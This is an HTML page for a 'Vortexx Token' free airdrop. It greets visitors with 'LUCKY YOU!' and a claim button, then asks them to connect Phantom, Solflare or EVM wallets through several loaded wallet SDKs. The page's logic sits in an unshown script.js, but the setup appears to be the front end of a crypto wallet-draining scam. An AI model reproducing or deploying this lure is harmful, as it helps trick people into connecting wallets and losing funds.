<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Vortexx Token – Free Airdrop</title>

<link rel="stylesheet" href="style.css">

<!-- Solana & EVM SDKs -->
<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
<script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>

<!-- WalletConnect v2 / Web3Modal v2 -->
<script src="https://unpkg.com/@walletconnect/ethereum-provider/dist/index.umd.js"></script>
<script src="https://unpkg.com/@web3modal/ethereum/dist/index.umd.js"></script>
<script src="https://unpkg.com/@web3modal/html/dist/index.umd.js"></script>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

<!-- Solflare v2 SDK -->
<script src="https://unpkg.com/@solflare-wallet/sdk/lib/index.iife.js"></script>
</head>

<body>

<!-- Landing Section -->
<div class="container" id="landingSection">
  <div class="logo-circle">VTXT</div>
  <h1>LUCKY YOU!</h1>
  <p>Vortexx-TOKEN airdrop is ongoing.</p>
  <button id="proceedBtn">Click to Claim Airdrop</button>
</div>

<!-- Connect Wallet Section -->
<div class="container hidden" id="connectSection">
  <button id="connectBtn">Connect Wallet</button>
</div>

<!-- Solana Wallet Input Section -->
<div class="container hidden" id="solanaSection">
  <input type="text" id="solAddress" placeholder="Wallet Address" />
  <div class="progress"><span></span></div>
  <button id="submitSol" class="hidden">Submit</button>
</div>

<!-- Terms Modal -->
<div class="modal hidden" id="termsModal">
  <div class="modal-card">
    <h2>Terms & Conditions</h2>
    <p>You confirm the wallet address is correct.</p>
    <button id="acceptBtn">Accept</button>
  </div>
</div>

<!-- Airdrop Page -->
<section id="airdropPage" class="hidden">
  <h2>VTXT Wallet</h2>
  <p id="userWallet">—</p>
  <div id="airdropBalance">0</div>
  <div id="balanceDiffSection" class="hidden">
    <span id="balanceDiff">0</span>
  </div>
</section>

<!-- Wallet Choice Modal -->
<div class="modal hidden" id="walletChoiceModal">
  <div class="modal-card">
    <h2>Select Wallet</h2>
    <button id="evmWalletBtn">Connect EVM Wallet</button>
    <button id="phantomWalletBtn">Connect Phantom</button>
    <button id="solflareWalletBtn">Connect Solflare</button>
    <button id="cancelWalletBtn">Cancel</button>
  </div>
</div>

<!-- JS Script -->
<script src="script.js"></script>
</body>
  </html>
